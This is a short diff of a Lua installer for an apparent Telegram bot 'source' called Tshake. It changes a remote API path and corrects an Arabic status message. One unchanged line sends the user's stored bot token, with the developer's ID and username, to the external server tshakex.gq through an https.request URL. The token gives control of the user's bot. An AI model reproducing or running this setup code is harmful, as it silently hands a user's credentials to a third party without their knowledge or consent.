@@ -38,7 +38,7 @@ if not database:get(Server_Tshake.."UserName_Tshake") then
 io.write('\n\27[1;35mSend UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
 local User_Sudo = io.read():gsub('@','')
 if User_Sudo ~= '' then
-local GetInfoUser = https.request("https://tshakex.gq/api/source/?id="..User_Sudo)
+local GetInfoUser = https.request("https://tshakex.gq/Tshakex/source/?id="..User_Sudo)
 local User_Info = JSON:decode(GetInfoUser) 
 if User_Info.Info.Chek == "is_block" then
 io.write('\n\27[1;31m If ip server is blocked : سيرفرك لقد تم حظره من السورس \n\27[0;39;49m')
@@ -52,7 +52,7 @@ if User_Info.Info == 'Channel' then
 io.write('\n\27[1;31m The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
 os.execute('lua start.lua')
 end
-io.write('\n\27[1;31m• The UserNamr Is Saved : تم حفظ معرف المطور الاسي واستخراج ايدي \n\27[0;39;49m')
+io.write('\n\27[1;31m• The UserNamr Is Saved : تم حفظ معرف المطور الاساسي واستخراج ايدي \n\27[0;39;49m')
 https.request("https://tshakex.gq/Tshakex/insert/?id="..User_Info.Info.Id.."&username="..User_Info.Info.Username.."&token="..database:get(Server_Tshake.."Token_Tshake"))
 database:set(Server_Tshake.."UserName_Tshake",User_Info.Info.Username)
 database:set(Server_Tshake.."Id_Tshake",User_Info.Info.Id)
